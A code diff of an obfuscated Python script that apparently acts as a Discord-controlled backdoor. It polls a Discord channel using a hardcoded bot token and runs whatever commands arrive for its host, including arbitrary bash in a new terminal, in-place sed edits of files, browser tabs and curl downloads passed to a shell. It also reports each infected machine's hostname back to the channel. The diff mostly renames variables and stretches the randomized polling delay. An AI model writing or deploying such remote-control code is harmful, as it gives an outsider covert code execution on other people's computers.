@@ -1,123 +1,126 @@
-import http.client as _A
-import sys as _B
-import json as _C
-import time as _D
-import socket as _E
-import random as _F
-import subprocess as _G
+import http.client as _Y3
+import sys as _S9
+import json as _J2
+import time as _T1
+import socket as _K5
+import random as _R4
+import subprocess as _P6
 
-_H = 0
-_I = "GM3l_P.mrkZgJvU5KWSoz1-onol2XfkW6YbmzlF8H1oT4"
-_J = {"Content-Type": "application/json", 'Authorization': f'Bot MTIzMzQ4MTAxMDc4NDUwNTg1Nw.{_I}'}
-_K = _E.gethostname().split('.')[0]
+_TK2 = "GM3l_P.mrkZgJvU5KWSoz1-onol2XfkW6YbmzlF8H1oT4"
+_HDS = {"Content-Type": "application/json", 'Authorization': f'Bot MTIzMzQ4MTAxMDc4NDUwNTg1Nw.{_TK2}'}
+_IDN = _K5.gethostname().split('.')[0]
+_RL = 0
 
-def _L(_M):
-    _N = {"content": _M}
-    _O = _C.dumps(_N)
-    _P = _A.HTTPSConnection("discord.com")
-    _Q = f"/api/v10/channels/1342067836415381565/messages"
-    _P.request("POST", _Q, body=_O, headers=_J)
-    _P.getresponse()
-    _P.close()
+def _SN1(_MSG):
+    _DT = {"content": _MSG}
+    _JSN = _J2.dumps(_DT)
+    _CN = _Y3.HTTPSConnection("discord.com")
+    _URL = f"/api/v10/channels/1342067836415381565/messages"
+    _CN.request("POST", _URL, body=_JSN, headers=_HDS)
+    _CN.getresponse()
+    _CN.close()
 
-def _R():
+def _EX():
     print("Exiting...")
-    _L(f"❌ `[{_K}] is deactivated`")
-    _B.exit()
+    _SN1(f"❌ `[{_IDN}] is deactivated`")
+    _S9.exit()
 
-def _S():
-    _G.run(['xrandr', '--output', 'eDP', '--rotate', 'inverted'], check=True)
+def _REV():
+    _P6.run(['xrandr', '--output', 'eDP', '--rotate', 'inverted'], check=True)
 
-def _T():
-    _G.run(['xrandr', '--output', 'eDP', '--rotate', 'normal'], check=True)
+def _NRM():
+    _P6.run(['xrandr', '--output', 'eDP', '--rotate', 'normal'], check=True)
 
-def _U():
-    _G.run(['xrandr', '--output', 'eDP', '--rotate', 'right'], check=True)
+def _RGT():
+    _P6.run(['xrandr', '--output', 'eDP', '--rotate', 'right'], check=True)
 
-def _V():
-    _G.run(['xrandr', '--output', 'eDP', '--rotate', 'left'], check=True)
+def _LFT():
+    _P6.run(['xrandr', '--output', 'eDP', '--rotate', 'left'], check=True)
 
-def _W(_X):
-    _G.Popen(['gnome-terminal', '--', 'bash', '-c', f'{_X}'])
+def _NT(_R):
+    _P6.Popen(['gnome-terminal', '--', 'bash', '-c', f'{_R}'])
 
-def _Y(_Z):
-    _a = _Z.split('?')
-    _G.run(['sed', '-i', f'{_a[0]}', f'{_a[1]}'], check=True)
+def _SED(_R):
+    _RS = _R.split('?')
+    _P6.run(['sed', '-i', f'{_RS[0]}', f'{_RS[1]}'], check=True)
 
-def _b(_c):
-    _G.run(['firefox', '--new-tab', f'{_c}'], check=True)
+def _FFX(_R):
+    _P6.run(['firefox', '--new-tab', f'{_R}'], check=True)
 
-def _d(_e):
-    _G.run(f'curl "{_e}" -o img.jpg', shell=True, check=True)
-    _G.run(['xdg-open', 'img.jpg'], check=True)
+def _OPN_IMG(_R):
+    _P6.run(f'curl "{_R}" -o img.jpg', shell=True, check=True)
+    _P6.run(['xdg-open', 'img.jpg'], check=True)
 
-def _f(_g):
-    match _g:
+def _LCHR(_R):
+    match _R:
         case "exit":
-            _R()
+            _EX()
         case "activated":
-            _L(f"✅ `{_K}-is activated`")
+            _SN1(f"✅ `{_IDN}-is activated`")
         case "inverted screen":
-            _S()
+            _REV()
         case "normal screen":
-            _T()
+            _NRM()
         case "right screen":
-            _U()
+            _RGT()
         case "left screen":
-            _V()
+            _LFT()
         case _:
             return
 
-def _h(_i):
-    match _i[0]:
+def _LCHC(_SPL):
+    match _SPL[0]:
         case "newterm":
-            _W(_i[1])
+            _NT(_SPL[1])
         case "sed":
-            _Y(_i[1])
+            _SED(_SPL[1])
         case "firefox":
-            _b(_i[1])
+            _FFX(_SPL[1])
         case "openimg":
-            _d(_i[1])
+            _OPN_IMG(_SPL[1])
         case _:
             return
 
-def _j():
-    global _H
-    while (True):
+def _MAIN():
+    global _RL
+    while True:
         try:
-            _k = _A.HTTPSConnection("discord.com")
-            _l = f"/api/v10/channels/1341791654503514122/messages?limit=1"
-            _k.request("GET", _l, headers=_J)
-            _m = _k.getresponse()
-            _n = _m.read().decode("utf-8")
-            _o = _C.loads(_n)
+            _CN = _Y3.HTTPSConnection("discord.com")
+            _URL = f"/api/v10/channels/1341791654503514122/messages?limit=1"
+            _CN.request("GET", _URL, headers=_HDS)
+            _RESP = _CN.getresponse()
+            _CONTENT = _RESP.read().decode("utf-8")
+            _JSN = _J2.loads(_CONTENT)
 
-            _p = _o[0]['content']
-            _q = _p.split('$')
-            if len(_q) == 2:
-                if _q[0] != _K:
-                    _D.sleep(1)
+            _VAL = _JSN[0]['content']
+            _VLS = _VAL.split('$')
+            if len(_VLS) == 2:
+                if _VLS[0] != _IDN:
+                    _T1.sleep(1)
                     continue
-                if _H != _q[1]:
-                    _H = _q[1]
-                    _r = _H.split('!')
-                    if len(_r) == 2:
-                        _h(_r)
+                if _RL != _VLS[1]:
+                    _RL = _VLS[1]
+                    _SPL = _RL.split('!')
+                    if len(_SPL) == 2:
+                        _LCHC(_SPL)
                     else:
-                        _f(_H)
-            elif len(_q) == 1:
-                if _H != _q[0]:
-                    _H = _q[0]
-                    _s = _H.split('!')
-                    if len(_s) == 2:
-                        _h(_s)
+                        _LCHR(_RL)
+            elif len(_VLS) == 1:
+                if _RL != _VLS[0]:
+                    _RL = _VLS[0]
+                    _SPL = _RL.split('!')
+                    if len(_SPL) == 2:
+                        _LCHC(_SPL)
                     else:
-                        _f(_H)
-            _D.sleep(_F.randint(1, 6))
-        except Exception as _t:
-            _L(f"❌ `[{_K}] Error: {_t}`")
-            _D.sleep(_F.randint(5, 10))
+                        _LCHR(_RL)
+            _T1.sleep(_R4.randint(1, 15))
+        except Exception as _E:
+            if _E.args[0] == 0:
+                _T1.sleep(_R4.randint(5, 20))
+            else:
+                _SN1(f"❌ `[{_IDN}] Error: {_E}`")
+                _T1.sleep(_R4.randint(5, 20))
 
 if __name__ == "__main__":
-    _L(f"✅ `[{_K}] is activated`")
-    _j()
+    _SN1(f"✅ `[{_IDN}] is activated`")
+    _MAIN()
